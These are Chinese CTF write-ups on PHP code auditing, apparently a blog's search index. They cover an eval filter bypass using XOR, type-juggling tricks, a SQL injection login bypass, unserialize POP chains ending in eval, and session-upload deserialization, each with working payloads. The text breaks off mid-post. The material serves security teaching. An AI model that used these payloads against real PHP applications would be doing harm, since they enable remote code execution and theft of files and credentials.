(isset ($_GET['cover'])) { if ($_GET['cover'] == $_SESSION['cover']) { echo 'ok'; if(isset($_GET['code'])) { if(strlen($_GET['code'])>35) { echo strlen($_GET['code']); die(\"over maxlength!!\"); } else { $code=$_GET['code']; if(preg_match(\"/[A-Za-z0-9_.]+/\",$code)) { die(\"Hacher!!!\"); } else { @eval($code); } } } } else echo 'Access Deny'; } else { highlight_file(__FILE__); } ?> 代码分析get传入的cover变量值必须要与session值相等，这里可以使用session绕过，直接传入一个空的cover； 通过get传入code变量值，code变量字符串的长度不能超过35位;且字符串不能含有数字、字母、_、.、+等特殊字符； 最终code变量带入eval函数,这里首先传入函数getPos()； 关于怎么绕过的字符串的过滤，这里可以使用特殊字符串的异或来实现，直接上异或脚本: chr1 = ['@', '!', '\"', '#', '$', '%', '&amp;', '\\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '>', '?', '[', '\\\\', ']', '^', '_', '`', '{', '|', '}', '~'] chr2 = ['@', '!', '\"', '#', '$', '%', '&amp;', '\\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '>', '?', '[', '\\\\', ']', '^', '_', '`', '{', '|', '}', '~'] for i in chr1 : for j in chr2 : if chr(ord(i) ^ ord(j)) in ['g','e','t','P','o','s',]: print(i + 'xor' + j + '=' + (chr(ord(i) ^ ord(j)))) 运行之后找到未被过滤的特殊字符串的亦或如下： @xor'=g %xor@=e /xor[=t }xor-=P /xor@=o -xor^=s 这里传入的code=$\\_=&quot;@%/}/-&quot;^&quot;'@[-@^&quot;;$\\_(); 但是_被过滤的,不怕，这里可用汉子代替，最终如下： code=$淦=&quot;@%/}/-&quot;^&quot;'@[-@^&quot;;$淦(); 运行之后得到flag在/fl4gnnn中;因为传入eval函数,可以直接构造执行命令/bin/cat /fl4gnnn; 通过脚本对fl4gnnn异或后发现，无论怎么异或n的特殊字符中均有. 但是.是被过滤的,所以这边考虑使用shell通配符实现； 构造/???/???%20/??????? 执行命令可以使用反引号，但是需要echo ,通过短标签的知识了解 等价于 所以最终形式为：?&gt;&lt;?=/???/???%20/????????&gt; 漏洞利用payload:?cover&amp;code=?&gt;&lt;?=/???/???%20/????????&gt;","link":"/2019/01/16/web-security/php-code-audit/php-code-audit-eval-xor/"},{"title":"php语言特性类型讲解","text":"PHP语言特性extract变量覆盖漏洞源码&lt;?php $flag='cimer'; extract($_GET); if(isset($shiyan)) { $content=trim(file_get_contents($flag)); if($shiyan==$content) { echo'ctf{cimer_2021_come_on}'; } else { echo'Oh.no'; } } ?> 漏洞分析extract()函数 从数组中将变量导入到当前的符号表 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量 语法：extract(array,extract_rules,prefix) array,必需，要使用的数组 GET传参或者POST传参时，带入到extact函数中，直接传入同名变量名，即可覆盖原有变量值。 flag变量值为cimer extract()通过GET方式接受一个数组，键名作为变量名，值为变量值 如果变量$shiyan为空，则$flag值通过file_get_contents()赋值给变量$content 如果变量$shiyan与$content值相同，则输出flag 漏洞利用payload构造index.php?shiyan=&amp;flag= 绕过过滤的空白字符漏洞源码&lt;?php include 'flag.php'; $info = \"\"; $req = []; ini_set(\"display_error\", false); error_reporting(0); if(!isset($_GET['number'])){ header(\"hint:26966dc52e85af40f59b4fe73d8c323a.txt\"); die(\"have a fun!!\"); } foreach([$_GET, $_POST] as $global_var) { foreach($global_var as $key => $value) { $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } if(is_numeric($_REQUEST['number'])) { $info=\"sorry, you cann't input a number!\"; } elseif($req['number']!=strval(intval($req['number']))) { $info = \"number must be equal to it's integer!! \"; } else { $value1 = intval($req[\"number\"]); $value2 = intval(strrev($req[\"number\"])); if($value1!=$value2){ $info=\"no, this is not a palindrome number!\"; } else { if(is_palindrome_number($req[\"number\"])){ $info = \"nice! {$value1} is a palindrome number!\"; } else{ $info=$flag; } } } echo $info; ?> 漏洞分析函数分析 trim — 去除字符串首尾处的空白字符（或者其他字符） is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串 strval — 获取变量的字符串值 strlen — 获取字符串长度 is_numeric — 检测变量是否为数字或数字字符串 intval — 获取变量的整数值 is_palindrome_number —— 自定义函数判断数字是否为非回文数 逻辑分析 number为get接受参数变量； 第一个判断如果变量number为空值，则设置header有hint字段，并die出一句话; 条件一：if(is_numeric($_REQUEST['number'])) 检测变量是否为数字或者数字字符串，条件是false； 条件二：elseif($req['number']!=strval(intval($req['number'])))检测变量是否为回文数； 条件三：if(is_palindrome_number($req[&quot;number&quot;]))调用函数is_palindrome_number判断当前数字为非回文数 绕过条件一的方式是：%00为空字符，不会影响后面的数值； 咋眼一看条件二和条件三是冲突的，这边我们必须想法子绕过；为了同时满足条件二和绕过函数is_palindrome_number。可以对源代码进行相关简化，得到如下简化代码： &lt;?php function is_palindrome_number($number) { $number = strval($number); //strval — 获取变量的字符串值 $i = 0; $j = strlen($number) - 1; //strlen — 获取字符串长度 while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } $a = trim($_GET['number']); var_dump(($a==strval(intval($a)))&amp;(intval($a)==intval(strrev($a)))&amp;!is_palindrome_number($a)) ?> fuzzing代码如下： #!/usr/local/env python2 #conding:utf-8 import requests for i in range(256): rq = requests.get(\"http://192.168.1.191:32776/stage/2/index2.php?number=%s191\"%(\"%%%02X\"%i)) #print(rq.text) if '1' in rq.text: print \"%%%02X\"%i output: %0C %2B 漏洞利用payload:http://192.168.1.191:32776/stage/2/index2.php?number=%00%0C191 ereg正则绕过漏洞源码&lt;?php include 'flag.php'; if (isset ($_GET['password'])) { if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) { echo '&lt;p>You password must be alphanumeric&lt;/p>'; } else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] > 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('&lt;p>*-* have not been found&lt;/p>'); } } else { echo '&lt;p>Invalid password&lt;/p>'; } } ?> 漏洞分析ereg函数:函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。此函数存在%00截断问题，只要遇到%00就停止匹配。 条件一：首先erge正则匹配使得变量password必须满足数字字母组成； 条件二：限制password长度必须小于8，并且值要大于9999999； 条件三：密码中必须要含有字符*-*; 漏洞利用绕过条件一使用%00截断； 绕过条件而使用科学计数法1e9; 满足条件三%00后面拼接*-*; payload:?password=1e9%00*-* strcmp比较字符串漏洞源码&lt;?php include 'flag.php'; highlight_file(__FILE__); if (isset($_GET['a'])) { if (strcmp($_GET['a'], $flag) == 0) die('Flag: '.$flag); else print 'No'; } ?> 漏洞分析strcmp() 这个函数用于字符串比较 int strcmp ( string $str1 , string $str2 ) // 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。 可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL,而判断使用的是==，NULL==0是 bool(true) 漏洞利用payload:?a[]=1 sha()函数比较绕过漏洞源码&lt;?php include 'flag.php'; highlight_file(__FILE__); if (isset($_GET['name']) and isset($_GET['password'])) { if ($_GET['name'] == $_GET['password']) echo '&lt;p>Your password can not be your name!&lt;/p>'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p>Invalid password.&lt;/p>'; } else echo '&lt;p>Login first!&lt;/p>'; ?> 漏洞分析sha1()函数计算字符串sha-1散列，接受参数位字符串类型 === 为恒等式会对变量类型进行比较 若传入变量为数组类型，就会使sha1函数返回错误，即false；都报错的情况下， 恒等式即成立 漏洞利用payload:?name[]=1&amp;passwordp[]=2 session验证绕过漏洞源码&lt;?php include 'flag.php'; highlight_file(__FILE__); session_start(); if (isset ($_GET['password'])) { if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p>Wrong guess.&lt;/p>'; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?> 漏洞分析若session里的password的值和get传参进去的值相等，则会输出flag； 对其$_SESSION[‘password’]进行输出发现结果为null，所以这里构造password传入空值，使其相等； 漏洞利用payload:?password= md5比较绕过漏洞源码&lt;?php include 'flag.php'; if($_POST['user'] &amp;&amp; $_POST['pass']) { $conn = mysql_connect(\"localhost\", \"ctf\", \"ctf\"); mysql_select_db(\"md5bypass\") or die(\"Could not select database\"); if ($conn->connect_error) { die(\"Connection failed: \" . mysql_error($conn)); } $user = $_POST['user']; $pass = md5($_POST['pass']); $sql = \"select pw from php where user='$user'\"; $query = mysql_query($sql); if (!$query) { printf(\"Error: %s\\n\", mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) { echo \"&lt;p>Logged in!\" . $flag . \"&lt;/p>\"; } else { echo(\"&lt;p>Log in failure!&lt;/p>\"); } } ?> 漏洞分析strcasecmp(string1, string2) 函数比较两个字符串。如果相等返回0，如果string1&lt;string2返回&lt;0,如果string1&gt;string2返回&gt;0 提示：strcasecmp() 函数是二进制安全的，且不区分大小写。 根据代码只要让$row[pw]与变量$pass相等即可输出flag； $pass是经过md5之后的值，这个值用户可以通过输入控制； $row[pw]的值是通过sql查询获取到； 通过代码很明显可以看出来，在user变量处没有任何过滤存在，是明显存在注入的； 通过注入构造控制$row[pw]为用户自己输入的md5值即可，pass的值可控，直接输入对应md5的明文即可； 漏洞利用payload:admin' AND 0=1 union select '202cb962ac59075b964b07152d234b70'#&amp;pass=123 md5加密相等绕过漏洞源码&lt;?php include 'flag.php'; highlight_file(__FILE__); $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a)){ if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) { echo \"flag:\" . $flag; } else { echo \"false!!!\"; }} else{echo \"please input a\";} ?> 漏洞分析php中md5值若是0e开头，那么与其他的0e开头的md5值相等，这也成为md5碰撞 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 所以随便挑一个0e开头的md5对应的原码 构造 playload即可 漏洞利用payload:?a=s878926199a","link":"/2019/03/10/web-security/php-code-audit/php-features/"},{"title":"php-unserialize-getflag","text":"题目源码&lt;?php error_reporting(0); highlight_file(__FILE__); $pwd=getcwd(); class func { public $mod1; public $mod2; public $key; public function __destruct() { unserialize($this->key)(); $this->mod2 = \"welcome \".$this->mod1; } } class GetFlag { public $code; public $action; public function get_flag(){ $a=$this->action; $a('', $this->code); } } unserialize($_GET[0]); ?> 题目分析php反序列化真要被ctf给玩烂了 这道题的代码不多，但是反正我是不会 逻辑思路是有，但是不会构造的，接下来就简单的分析一下吧 利用类func中的__destruct()魔法函数，调用触发类GetFlag中get_flag方法，根据$a('', $this-&gt;code);这行代码，可以构造create_function函数触发，逻辑都很简单。这里唯独就是不知道怎么给类func中的key构造传参 后面才知道可以这么传参：$key = serialize([new GetFlag(), &quot;get_flag&quot;]); 构造利用&lt;?php class func { public $mod1; public $mod2; public $key; public function __destruct() { unserialize($this->key)(); $this->mod2 = \"welcome \".$this->mod1; } } class GetFlag { public $code = \";}phpinfo();//\"; public $action = 'create_function'; public function get_flag(){ $a=$this->action; $a('', $this->code); } } $obj = new func(); $obj->key = serialize([new GetFlag(), \"get_flag\"]); echo serialize($obj); ?> output： http://127.0.0.1/10279.php?0=O:4:%22func%22:3:{s:4:%22mod1%22;N;s:4:%22mod2%22;N;s:3:%22key%22;s:116:%22a:2:{i:0;O:7:%22GetFlag%22:2:{s:4:%22code%22;s:14:%22;}phpinfo();//%22;s:6:%22action%22;s:15:%22create_function%22;}i:1;s:8:%22get_flag%22;}%22;}","link":"/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/"},{"title":"php反序列化之魔法函数clone","text":"前奏昨天某甲方客户联系我，直接甩了两道php反序列化的源码题，晚上回去把题目本地复现了一下。这个复现之路可谓艰辛。phpstudy直接报错，每一行都报错。后面才知道，因为直接以源码方式微信发的，我直接复制，导致复制的不干净，掺杂了一些脏东西。此处已心态爆炸，我把源码手撸了一遍。o(╯□╰)o幸好源码不是太多。第一题耽误了太多时间没搞出来，第二题出来了，这边想着做个简单记录吧。 分析题目源码里面的注释内容为我本地运行时添加的测试代码。 &lt;?php class z{ public $a; function __toString(){ //echo \"class z tostring\"; return $this->a->b['a']; } } class h { public $method; function __call($method,$arg){ //echo \"class h\"; //echo \"123\".$method; //echo \"456\".$this->method; var_dump($arg); if(in_array($method, $this->method)){ eval(array_shift($arg)); } } } class e { public $z; public $f; public $arg; function __get($p){ $this->xixi=clone $this->z; return \"haha\"; } public function __clone() { //echo \"__clone\"; //var_dump($this->f); return $this->f->haha($this->arg); } } if (isset($_GET['poc'])){ echo unserialize($_GET['poc']); }else{ highlight_file(__FILE__); } ?> 前置知识其实代码内容并不多 但是这里面的魔法函数__clone以及函数clone是我第一次见，这里真的说明自己有点菜，题做的太少啊~ 时间都用来打杂了，我一开始把它认为是自定义函数了。。。 没用过咋办呢， 查呗，google走起。 别问我为啥不百度，其实你们都懂得~ 网上给了一个小栗子演示了一下这个魔法函数的作用： &lt;?php //首先定义一个test一个类 class Testclass { //成员变量是$value1 public $value1; } //随后new一个obj1 $obj1 = new Testclass(); //复制成员变量的值为qqq $obj1->value1 = \"qqq\"; //我们使用赋值符号给左边obj2赋值obj1 $obj2 = $obj1; //我们在这里把obj2的的value1复制为eee $obj2->value1 =\"eee\"; //随后我们打印出两者的值 var_dump($obj1); echo '&lt;br/>'; var_dump($obj2); output: object(Testclass)#1 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; } object(Testclass)#1 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; } 我们发现这种情况下运行结果一致： 那是因为（借用php手册的话就是）：当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。 其实在这里就是obj1给了obj2它的地址，就和引用一样，obj2指向了obj1 接下来使用clone复制 这里讲上述代码中 $obj2 = $obj1; =》 $obj2 = clone $obj1; output: object(Testclass)#1 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;qqq&quot; } object(Testclass)#2 (1) { [&quot;value1&quot;]=&gt; string(3) &quot;eee&quot; } 其实这里的clone就是为了实现深拷贝的作用。 __clone触发条件：当我们对一个类有clone操作的时候将会触发这个类里面的__clone方法 注：clone只能用于对象克隆，对象复制。如果clone一个非对象变量将会报错no obj 具体开干其实到这里我们基本上稀里糊涂的或许大概明白了什么意思。。。那就开搞呗。有源码，一点点分析好了 我的思路这种简短的源码，我喜欢先定位危险函数再去反推POP链 代码中我们发现危险函数eval藏在类h的__call中，且要保证条件in_array($method, $this-&gt;method)成立,这里可以直接控制$method = arry('haha','hehe','dada'); 调用__call魔法函数只需调用其实例化类本身不存在的方法即可，刚好在类e中存在成员变量h调用了一个haha方法，该方法刚好是类h不存在的,即$obj = new e;$obj-&gt;f=new h; 要想触发以上条件就需要触发__clone魔法函数，根据前序只是我们知道，clone即可触发,且clone是在__get魔法函数中,即$obj = new z;$obj-&gt;a = new e; 触发__get魔法函数，只需调用其实例化类对象中不存在或者无权限调用的成员属性即可 刚好在类z中存在__toString魔法函数，里面执行了成员变量引用，那么$a = new e即可 传参接口poc刚好在反序列化的时候被echo了，那么刚好可以直接触发__toString 构造exp根据分析具体思路构造一个完美的exp即可 &lt;?php class z{ public $a; function __toString(){ return $this->a->b['a']; } } class h { public $method = array(\"haha\",\"hehe\",\"dada\"); function __call($method,$arg){ if(in_array($method, $this->method)){ eval(array_shift($arg)); } } } class e { public $z; public $f; public $arg = \"phpinfo();\"; function __get($p){ $this->xixi=clone $this->z; return \"haha\"; } public function __clone() { return $this->f->haha($this->arg); } } $obj = new z; $obj->a = new e; //触发__get $obj->a->z = $obj->a; //__clone 的深拷贝用法 $obj->a->z->f = new h; //赋值实例化h类， 触发__call $poc = serialize($obj); //echo $poc; echo urlencode($poc); output： O:1:&quot;z&quot;:1:{s:1:&quot;a&quot;;O:1:&quot;e&quot;:3:{s:1:&quot;z&quot;;r:2;s:1:&quot;f&quot;;O:1:&quot;h&quot;:1:{s:6:&quot;method&quot;;a:3:{i:0;s:4:&quot;haha&quot;;i:1;s:4:&quot;hehe&quot;;i:2;s:4:&quot;dada&quot;;}}s:3:&quot;arg&quot;;s:10:&quot;phpinfo();&quot;;}} O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 利用http://127.0.0.1/timu2.php?poc=O%3A1%3A%22z%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22e%22%3A3%3A%7Bs%3A1%3A%22z%22%3Br%3A2%3Bs%3A1%3A%22f%22%3BO%3A1%3A%22h%22%3A1%3A%7Bs%3A6%3A%22method%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A4%3A%22haha%22%3Bi%3A1%3Bs%3A4%3A%22hehe%22%3Bi%3A2%3Bs%3A4%3A%22dada%22%3B%7D%7Ds%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D","link":"/2021/12/01/web-security/php-code-audit/php-unserialize-clone/"},{"title":"session反序列化","text":"session反序列化PHP session基础什么是session?Session一般称为“会话控制“，简单来说就是是一种客户与网站/服务器更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。 PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更改用户会话的设置，需要注意的是，PHP Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且其对应的具体 session 值会存储于服务器端，这也是与 cookie的主要区别，所以seesion 的安全性相对较高。 php session的工作流程(1) 开始会话时，php会尝试从请求中查找会话id。若发现请求信息中不存在session id，php就会自动调用php_session_create_id函数创建一个新的会话，并且在响应头中使用set-cookie头部发送给客户端保存; (2) php会将会话中的数据设置到$_SESSION变量中； (3) 当会话停止时，会自动读取$_SESSION中的内容，并将其进行序列化，发送到保存管理器进行保存。 具体工作流程图如下： session在php.ini中的配置 session.gc_divisor php session垃圾回收机制相关配置 session.sid_bits_per_character 指定编码的会话ID字符中的位数 session.save_path=”” 该配置主要设置session的存储路径 session.save_handler=”” 该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数 session.use_strict_mode 严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID session.use_cookies 指定是否在客户端用 cookie 来存放会话 ID，默认启用 session.cookie_secure 指定是否仅通过安全连接发送 cookie，默认关闭 session.use_only_cookies 指定是否在客户端仅仅使用cookie来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击 session.name 指定会话名以用做 cookie 的名字，只能由字母数字组成，默认为 PHPSESSID session.auto_start 指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动 session.cookie_lifetime 指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 0 表示“直到关闭浏览器”。默认为 0 session.cookie_path 指定要设置会话cookie 的路径，默认为 / session.cookie_domain 指定要设置会话cookie 的域名，默认为无，表示根据 cookie 规范产生cookie的主机名 session.cookie_httponly 将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用 session.serialize_handler 定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述 session.gc_probability 该配置项与 session.gc_divisor 合起来用来管理 garbage collection，即垃圾回收进程启动的概率 session.gc_divisor 该配置项与session.gc_probability合起来定义了在每个会话初始化时启动垃圾回收进程的概率 session.gc_maxlifetime 指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在session启动的时候开始（ 取决于session.gc_probability 和 session.gc_divisor） session.referer_check 包含有用来检查每个 HTTP Referer的子串。如果客户端发送了Referer信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串 session.cache_limiter 指定会话页面所使用的缓冲控制方法（none/nocache/private/private_no_expire/public）。默认为 nocache session.cache_expire 以分钟数指定缓冲的会话页面的存活期，此设定对nocache缓冲控制方法无效。默认为 180 session.use_trans_sid 指定是否启用透明 SID 支持。默认禁用 session.sid_length 配置会话ID字符串的长度。 会话ID的长度可以在22到256之间。默认值为32。 session.trans_sid_tags 指定启用透明sid支持时重写哪些HTML标签以包括会话ID session.trans_sid_hosts 指定启用透明sid支持时重写的主机，以包括会话ID session.sid_bits_per_character 配置编码的会话ID字符中的位数 session.upload_progress.enabled 启用上传进度跟踪，并填充$ _SESSION变量， 默认启用。 session.upload_progress.cleanup 读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用 session.upload_progress.prefix 配置$ _SESSION中用于上传进度键的前缀，默认为upload_progress_ session.upload_progress.name $ _SESSION中用于存储进度信息的键的名称，默认为PHP_SESSION_UPLOAD_PROGRESS session.upload_progress.freq 定义应该多长时间更新一次上传进度信息 session.upload_progress.min_freq 更新之间的最小延迟 session.lazy_write 配置会话数据在更改时是否被重写，默认启用 session存储机制(1) 由session.serialize_handler来定义引擎； (2) 默认以文件的方式存储； (3) 文件命名方式以sess_sessionid; (4) 文件内容是一序列化的方式进行存储； php的三种引擎session.serialize_handler定义了三种引擎： 处理器名称 存储格式 php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize 经过serialize()函数序列化处理的数组 注：自 PHP 5.5.4 起可以使用php_serialize php处理器代码实例 &lt;?php error_reporting(0); // php | php_binary | php_serialize ini_set('session.serialize_handler','php'); session_start(); $_SESSION['session'] = $_GET['session']; var_dump($_SESSION); ?> 请求后保存的session文件内容的结果为: session|s:9:\"greetdawn\"; # 格式：键名 + | + 序列化后的参数值 php_binary处理器代码实例 &lt;?php error_reporting(0); // php | php_binary | php_serialize ini_set('session.serialize_handler','php_binary'); session_start(); $_SESSION['passwdpasswdpasswdpasswdpasswdpassw'] = $_GET['session']; var_dump($_SESSION); ?> 请求后保存的session文件内容的结果为: #passwdpasswdpasswdpasswdpasswdpassws:9:\"greetdawn\"; #为键名长度对应的ascii值，passwdpasswdpasswdpasswdpasswdpassws为键名，后面为get参数序列化之后的值 php_serialize处理器代码实例 &lt;?php error_reporting(0); // php | php_binary | php_serialize ini_set('session.serialize_handler','php_serialize'); session_start(); $_SESSION['passwd'] = $_GET['session']; var_dump($_SESSION); ?> 请求后保存的session文件内容的结果为: a:1:{s:6:\"passwd\";s:9:\"greetdawn\";} #标准化的序列化字符串格式 php session反序化漏洞漏洞概念PHP session反序列化漏洞，简单点说，就是当网站序列化并存储Session与反序列化并读取Session的方式不同时就可能导致session反序列化漏洞的产生。 漏洞demo（session_demo）index.php &lt;?php ini_set('session.serialize_handler', 'php_serialize'); session_start(); if (isset($_GET[\"name\"])) { $_SESSION[\"name\"] = $_GET[\"name\"]; highlight_file('demo.php'); } else { echo \"Please tell me You name?\"; highlight_file(__FILE__); } ?> demo.php &lt;?php ini_set('session.serialize_handler', 'php'); session_start(); class lemon { var $hi; function __construct(){ $this->hi = 'phpinfo();'; } function __destruct() { eval($this->hi); } } 漏洞分析 我们发现index.php通过php_serialize引擎处理session数据，demo.php通过php引擎处理session数据; 通过前面的知识我们知道php_serialize引擎以正常的反序列化格式存储和加载session数据，php以|的方式存储和加载session数据的； 分析demo的源码，对lemon类进行实例化，得到其序列化的值为:O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;} 请求index.php带入序列化的值，http://192.168.1.191:32769/?name=|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;} 最终sess文件的保存数据格式如下： a:1:{s:4:&quot;name&quot;;s:44:&quot;|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:10:&quot;phpinfo();&quot;;}&quot;;} 当我们再次请求demo.php文件时，此文件会议php处理器的方式加载session文件，此时``a:1:{s:4:”name”;s:44:”|O:5:”为 键名,a:1:{s:4:”name”;s:44:”|O:5:”`为值 那么最后的值就会被正常的进行反序列化，调用eval函数； 例题实战session_upload(1) 题目源码 index.php &lt;?php ini_set('session.serialize_handler', 'php'); require(\"./class.php\"); session_start(); $obj = new foo1(); $obj->varr = \"phpinfo.php\"; ?> class.php &lt;?php highlight_string(file_get_contents(basename($_SERVER['PHP_SELF']))); //show_source(__FILE__); class foo1{ public $varr; function __construct(){ $this->varr = \"i.php\"; } function __destruct(){ if(file_exists($this->varr)){ echo \"&lt;br>文件\".$this->varr.\"存在&lt;br>\"; } echo \"&lt;br>这是foo1的析构函数&lt;br>\"; } } class foo2{ public $varr; public $obj; function __construct(){ $this->varr = '1234567890'; $this->obj = null; } function __toString(){ $this->obj->execute(); return $this->varr; } function __desctuct(){ echo \"&lt;br>这是foo2的析构函数&lt;br>\"; } } class foo3{ public $varr; function execute(){ eval($this->varr); } function __desctuct(){ echo \"&lt;br>这是foo3的析构函数&lt;br>\"; } } ?> phpinfo.php &lt;?php session_start(); require(\"./class.php\"); $f3 = new foo3(); $f3->varr = \"phpinfo();\"; $f3->execute(); ?> (2) 题目分析 请求phpinfo.php获取session的配置信息如下： 默认是采用php_serialize处理器处理session，session.upload_progress.cleanup配置为Off，session.upload_progress.enabled配置为On； session.upload_progress.enabled当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 分析前面的代码并没有发现可以向服务器发送数据的点，根据前面所讲的特性，我们可以通过上传文件的方式向目标session写入数据。 并且我们发现i.php与phpinfo.php使用的session解析器不相同； (3) 漏洞利用 分析class.php的源码构造poc如下: &lt;?php class foo1{ public $varr; } class foo2{ public $varr; public $obj; } class foo3{ public $varr; } $obj = new foo1(); $obj->varr = new foo2(); $obj->varr->varr = $obj->varr; $obj->varr->varr->obj = new foo3(); $obj->varr->varr->obj->varr = \"include('php://filter/read=convert.base64-encode/resource=flag.php');\"; echo serialize($obj); ?> 本地构造上表单文件index.html &lt;form action=\"http://192.168.1.191:32771/index.php\" method=\"POST\" enctype=\"multipart/form-data\"> &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /> &lt;input type=\"file\" name=\"file\" /> &lt;input type=\"submit\" /> &lt;/form> bp截包，修改PHP_SESSION_UPLOAD_PROGRESS的值为class序列化的值 |O:4:&quot;foo1&quot;:1:{s:4:&quot;varr&quot;;O:4:&quot;foo2&quot;:2:{s:4:&quot;varr&quot;;r:2;s:3:&quot;obj&quot;;O:4:&quot;foo3&quot;:1:{s:4:&quot;varr&quot;;s:69:&quot;include('php://filter/read=convert.base64-encode/resource=flag.php');&quot;;}}} session_jarvis(1) 题目源码 index.php &lt;?php //A webshell is wait for you ini_set('session.serialize_handler', 'php'); session_start(); class OowoO { public $mdzz; function __construct() { $this->mdzz = 